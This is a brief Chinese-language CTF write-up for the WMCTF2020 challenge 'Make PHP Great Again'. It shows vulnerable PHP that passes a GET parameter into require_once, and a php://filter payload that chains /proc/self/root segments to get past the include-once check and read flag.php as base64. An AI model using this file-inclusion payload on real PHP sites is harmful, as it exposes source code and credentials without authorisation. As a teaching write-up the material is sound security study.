# [WMCTF2020]Make PHP Great Again

## 知识点

`文件包含`

`绕过包含次数限制`

## 解题

题目首页直接给了`php`源码

```php
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

发现已经包含了一次`flag.php`，`require_once`无法继续包含`flag.php`了

### 绕过包含次数限制

```php
php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

路径中的`/proc/self/root`就表示`/` 所以`/proc/self/root/proc/self/root···`就一直表示`/`路径。至于为什么可以这样，可以看[php源码分析 require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235)的分析。